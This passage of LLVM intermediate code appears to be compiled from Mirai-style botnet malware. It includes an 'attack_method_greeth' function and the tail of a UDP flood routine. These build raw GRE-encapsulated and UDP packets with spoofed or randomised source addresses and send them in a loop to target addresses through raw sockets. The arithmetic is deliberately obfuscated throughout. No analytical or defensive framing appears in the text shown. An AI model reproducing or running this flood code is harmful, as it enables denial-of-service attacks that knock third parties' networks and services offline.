  %466 = load i8*, i8** %31, align 8
  %467 = load i32, i32* %18, align 4
  call void @rand_str(i8* %466, i32 %467)
  br label %468

; <label>:468:                                    ; preds = %465, %462
  %469 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %470 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %469, i32 0, i32 7
  store i16 0, i16* %470, align 2
  %471 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %472 = bitcast %struct.iphdr* %471 to i16*
  %473 = call zeroext i16 @checksum_generic(i16* %472, i32 20)
  %474 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %475 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %474, i32 0, i32 7
  store i16 %473, i16* %475, align 2
  %476 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %477 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %476, i32 0, i32 7
  store i16 0, i16* %477, align 2
  %478 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %479 = bitcast %struct.iphdr* %478 to i16*
  %480 = call zeroext i16 @checksum_generic(i16* %479, i32 20)
  %481 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %482 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %481, i32 0, i32 7
  store i16 %480, i16* %482, align 2
  %483 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %484 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %483, i32 0, i32 3
  store i16 0, i16* %484, align 2
  %485 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %486 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %487 = bitcast %struct.udphdr* %486 to i8*
  %488 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %489 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %488, i32 0, i32 2
  %490 = load i16, i16* %489, align 2
  %491 = load i32, i32* %18, align 4
  %492 = sext i32 %491 to i64
  %493 = sub i64 0, 8
  %494 = sub i64 0, %492
  %495 = add i64 %493, %494
  %496 = sub i64 0, %495
  %497 = add i64 8, %492
  %498 = trunc i64 %496 to i32
  %499 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %485, i8* %487, i16 zeroext %490, i32 %498)
  %500 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %501 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %500, i32 0, i32 3
  store i16 %499, i16* %501, align 2
  %502 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i64 %504
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i32 0, i32 0
  %507 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %506, i32 0, i32 0
  store i16 2, i16* %507, align 4
  %508 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %509 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %508, i32 0, i32 9
  %510 = load i32, i32* %509, align 4
  %511 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %512 = load i32, i32* %9, align 4
  %513 = sext i32 %512 to i64
  %514 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %511, i64 %513
  %515 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i32 0, i32 0
  %516 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %515, i32 0, i32 2
  %517 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %516, i32 0, i32 0
  store i32 %510, i32* %517, align 4
  %518 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %519 = load i32, i32* %9, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 0
  %523 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %522, i32 0, i32 1
  store i16 0, i16* %523, align 2
  %524 = load i32, i32* %10, align 4
  %525 = load i8*, i8** %26, align 8
  %526 = load i32, i32* %18, align 4
  %527 = sext i32 %526 to i64
  %528 = add i64 52, 5148012323092077455
  %529 = add i64 %528, %527
  %530 = sub i64 %529, 5148012323092077455
  %531 = add i64 52, %527
  %532 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %533 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %534 = load i32, i32* %9, align 4
  %535 = sext i32 %534 to i64
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %533, i64 %535
  %537 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %536, i32 0, i32 0
  %538 = bitcast %struct.sockaddr_in* %537 to %struct.sockaddr*
  store %struct.sockaddr* %538, %struct.sockaddr** %532, align 8
  %539 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %540 = load %struct.sockaddr*, %struct.sockaddr** %539, align 8
  %541 = call i64 @sendto(i32 %524, i8* %525, i64 %530, i32 16384, %struct.sockaddr* %540, i32 16)
  br label %542

; <label>:542:                                    ; preds = %468
  %543 = load i32, i32* %9, align 4
  %544 = add i32 %543, 1285112946
  %545 = add i32 %544, 1
  %546 = sub i32 %545, 1285112946
  %547 = add nsw i32 %543, 1
  store i32 %546, i32* %9, align 4
  br label %328

; <label>:548:                                    ; preds = %328
  br label %327

; <label>:549:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %576

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %576

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %321, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %328

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = and i8 %130, 64
  %133 = xor i8 %130, 64
  %134 = or i8 %132, %133
  %135 = or i8 %130, 64
  store i8 %134, i8* %126, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = xor i8 %138, -1
  %140 = xor i8 -16, -1
  %141 = xor i8 -22, -1
  %142 = or i8 %139, %140
  %143 = or i8 -22, %141
  %144 = xor i8 %142, -1
  %145 = and i8 %144, %143
  %146 = and i8 %138, -16
  %147 = and i8 %145, 5
  %148 = xor i8 %145, 5
  %149 = or i8 %147, %148
  %150 = or i8 %145, 5
  store i8 %149, i8* %137, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = sub i64 66, 3142787587626905835
  %157 = add i64 %156, %155
  %158 = add i64 %157, 3142787587626905835
  %159 = add i64 66, %155
  %160 = trunc i64 %158 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  br i1 %172, label %173, label %177

; <label>:173:                                    ; preds = %101
  %174 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 4
  store i16 %174, i16* %176, align 2
  br label %177

; <label>:177:                                    ; preds = %173, %101
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 6
  store i8 47, i8* %179, align 1
  %180 = load i32, i32* %21, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i32 0, i32 1
  %188 = load i32, i32* %187, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 9
  store i32 %188, i32* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %192 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %193 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %195 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %196 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %198 = bitcast %struct.iphdr* %197 to i8*
  %199 = load i8, i8* %198, align 4
  %200 = xor i8 %199, -1
  %201 = xor i8 15, -1
  %202 = xor i8 55, -1
  %203 = or i8 %200, %201
  %204 = or i8 55, %202
  %205 = xor i8 %203, -1
  %206 = and i8 %205, %204
  %207 = and i8 %199, 15
  %208 = and i8 %206, 64
  %209 = xor i8 %206, 64
  %210 = or i8 %208, %209
  %211 = or i8 %206, 64
  store i8 %210, i8* %198, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %213 = bitcast %struct.iphdr* %212 to i8*
  %214 = load i8, i8* %213, align 4
  %215 = xor i8 -16, -1
  %216 = xor i8 %214, %215
  %217 = and i8 %216, %214
  %218 = and i8 %214, -16
  %219 = xor i8 %217, -1
  %220 = xor i8 5, -1
  %221 = xor i8 67, -1
  %222 = and i8 %219, 67
  %223 = and i8 %217, %221
  %224 = and i8 %220, 67
  %225 = and i8 5, %221
  %226 = or i8 %222, %223
  %227 = or i8 %224, %225
  %228 = xor i8 %226, %227
  %229 = or i8 %219, %220
  %230 = xor i8 %229, -1
  %231 = or i8 67, %221
  %232 = and i8 %230, %231
  %233 = or i8 %228, %232
  %234 = or i8 %217, 5
  store i8 %233, i8* %213, align 4
  %235 = load i8, i8* %12, align 1
  %236 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %237 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %236, i32 0, i32 1
  store i8 %235, i8* %237, align 1
  %238 = load i32, i32* %18, align 4
  %239 = sext i32 %238 to i64
  %240 = sub i64 0, %239
  %241 = sub i64 28, %240
  %242 = add i64 28, %239
  %243 = trunc i64 %241 to i16
  %244 = call zeroext i16 @htons(i16 zeroext %243) #7
  %245 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  %247 = load i16, i16* %13, align 2
  %248 = zext i16 %247 to i32
  %249 = xor i32 %248, -1
  %250 = and i32 -672716166, %249
  %251 = xor i32 -672716166, -1
  %252 = and i32 %248, %251
  %253 = xor i32 -1, -1
  %254 = and i32 %253, -672716166
  %255 = and i32 -1, %251
  %256 = or i32 %250, %252
  %257 = or i32 %254, %255
  %258 = xor i32 %256, %257
  %259 = xor i32 %248, -1
  %260 = trunc i32 %258 to i16
  %261 = call zeroext i16 @htons(i16 zeroext %260) #7
  %262 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 3
  store i16 %261, i16* %263, align 4
  %264 = load i8, i8* %14, align 1
  %265 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 5
  store i8 %264, i8* %266, align 4
  %267 = load i8, i8* %15, align 1
  %268 = icmp ne i8 %267, 0
  br i1 %268, label %269, label %273

; <label>:269:                                    ; preds = %177
  %270 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %271 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 4
  store i16 %270, i16* %272, align 2
  br label %273

; <label>:273:                                    ; preds = %269, %177
  %274 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 6
  store i8 17, i8* %275, align 1
  %276 = call i32 @rand_next()
  %277 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 8
  store i32 %276, i32* %278, align 4
  %279 = load i8, i8* %20, align 1
  %280 = icmp ne i8 %279, 0
  br i1 %280, label %281, label %287

; <label>:281:                                    ; preds = %273
  %282 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  %284 = load i32, i32* %283, align 4
  %285 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 9
  store i32 %284, i32* %286, align 4
  br label %303

; <label>:287:                                    ; preds = %273
  %288 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %289 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %288, i32 0, i32 8
  %290 = load i32, i32* %289, align 4
  %291 = add i32 %290, 706999157
  %292 = sub i32 %291, 1024
  %293 = sub i32 %292, 706999157
  %294 = sub i32 %290, 1024
  %295 = xor i32 %293, -1
  %296 = and i32 -1, %295
  %297 = xor i32 -1, -1
  %298 = and i32 %293, %297
  %299 = or i32 %296, %298
  %300 = xor i32 %293, -1
  %301 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 9
  store i32 %299, i32* %302, align 4
  br label %303

; <label>:303:                                    ; preds = %287, %281
  %304 = load i16, i16* %16, align 2
  %305 = call zeroext i16 @htons(i16 zeroext %304) #7
  %306 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 0
  store i16 %305, i16* %307, align 2
  %308 = load i16, i16* %17, align 2
  %309 = call zeroext i16 @htons(i16 zeroext %308) #7
  %310 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %311 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %310, i32 0, i32 1
  store i16 %309, i16* %311, align 2
  %312 = load i32, i32* %18, align 4
  %313 = sext i32 %312 to i64
  %314 = sub i64 0, %313
  %315 = sub i64 8, %314
  %316 = add i64 8, %313
  %317 = trunc i64 %315 to i16
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 2
  store i16 %318, i16* %320, align 2
  br label %321

; <label>:321:                                    ; preds = %303
  %322 = load i32, i32* %9, align 4
  %323 = sub i32 0, %322
  %324 = sub i32 0, 1
  %325 = add i32 %323, %324
  %326 = sub i32 0, %325
  %327 = add nsw i32 %322, 1
  store i32 %326, i32* %9, align 4
  br label %96

; <label>:328:                                    ; preds = %96
  br label %329

; <label>:329:                                    ; preds = %575, %328
  store i32 0, i32* %9, align 4
  br label %330

; <label>:330:                                    ; preds = %570, %329
  %331 = load i32, i32* %9, align 4
  %332 = load i8, i8* %5, align 1
  %333 = zext i8 %332 to i32
  %334 = icmp slt i32 %331, %333
  br i1 %334, label %335, label %575

; <label>:335:                                    ; preds = %330
  %336 = load i8**, i8*** %11, align 8
  %337 = load i32, i32* %9, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds i8*, i8** %336, i64 %338
  %340 = load i8*, i8** %339, align 8
  store i8* %340, i8** %30, align 8
  %341 = load i8*, i8** %30, align 8
  %342 = bitcast i8* %341 to %struct.iphdr*
  store %struct.iphdr* %342, %struct.iphdr** %31, align 8
  %343 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i64 1
  %345 = bitcast %struct.iphdr* %344 to %struct.grehdr*
  store %struct.grehdr* %345, %struct.grehdr** %32, align 8
  %346 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %347 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %346, i64 1
  %348 = bitcast %struct.grehdr* %347 to %struct.ethhdr*
  store %struct.ethhdr* %348, %struct.ethhdr** %33, align 8
  %349 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %350 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %349, i64 1
  %351 = bitcast %struct.ethhdr* %350 to %struct.iphdr*
  store %struct.iphdr* %351, %struct.iphdr** %34, align 8
  %352 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %353 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %352, i64 1
  %354 = bitcast %struct.iphdr* %353 to %struct.udphdr*
  store %struct.udphdr* %354, %struct.udphdr** %35, align 8
  %355 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %356 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %355, i64 1
  %357 = bitcast %struct.udphdr* %356 to i8*
  store i8* %357, i8** %36, align 8
  %358 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %359 = load i32, i32* %9, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 2
  %363 = load i8, i8* %362, align 4
  %364 = zext i8 %363 to i32
  %365 = icmp slt i32 %364, 32
  br i1 %365, label %366, label %389

; <label>:366:                                    ; preds = %335
  %367 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %368 = load i32, i32* %9, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %367, i64 %369
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %370, i32 0, i32 1
  %372 = load i32, i32* %371, align 4
  %373 = call i32 @ntohl(i32 %372) #7
  %374 = call i32 @rand_next()
  %375 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %378, i32 0, i32 2
  %380 = load i8, i8* %379, align 4
  %381 = zext i8 %380 to i32
  %382 = lshr i32 %374, %381
  %383 = sub i32 0, %382
  %384 = sub i32 %373, %383
  %385 = add i32 %373, %382
  %386 = call i32 @htonl(i32 %384) #7
  %387 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i32 0, i32 9
  store i32 %386, i32* %388, align 4
  br label %389

; <label>:389:                                    ; preds = %366, %335
  %390 = load i32, i32* %21, align 4
  %391 = icmp eq i32 %390, -1
  br i1 %391, label %392, label %396

; <label>:392:                                    ; preds = %389
  %393 = call i32 @rand_next()
  %394 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %395 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %394, i32 0, i32 8
  store i32 %393, i32* %395, align 4
  br label %396

; <label>:396:                                    ; preds = %392, %389
  %397 = load i16, i16* %13, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  br i1 %399, label %400, label %430

; <label>:400:                                    ; preds = %396
  %401 = call i32 @rand_next()
  %402 = xor i32 65535, -1
  %403 = xor i32 %401, %402
  %404 = and i32 %403, %401
  %405 = and i32 %401, 65535
  %406 = trunc i32 %404 to i16
  %407 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %408 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %407, i32 0, i32 3
  store i16 %406, i16* %408, align 4
  %409 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 3
  %411 = load i16, i16* %410, align 4
  %412 = zext i16 %411 to i32
  %413 = sub i32 0, 1000
  %414 = add i32 %412, %413
  %415 = sub nsw i32 %412, 1000
  %416 = xor i32 %414, -1
  %417 = and i32 -1917480047, %416
  %418 = xor i32 -1917480047, -1
  %419 = and i32 %414, %418
  %420 = xor i32 -1, -1
  %421 = and i32 %420, -1917480047
  %422 = and i32 -1, %418
  %423 = or i32 %417, %419
  %424 = or i32 %421, %422
  %425 = xor i32 %423, %424
  %426 = xor i32 %414, -1
  %427 = trunc i32 %425 to i16
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 3
  store i16 %427, i16* %429, align 4
  br label %430

; <label>:430:                                    ; preds = %400, %396
  %431 = load i16, i16* %16, align 2
  %432 = zext i16 %431 to i32
  %433 = icmp eq i32 %432, 65535
  br i1 %433, label %434, label %443

; <label>:434:                                    ; preds = %430
  %435 = call i32 @rand_next()
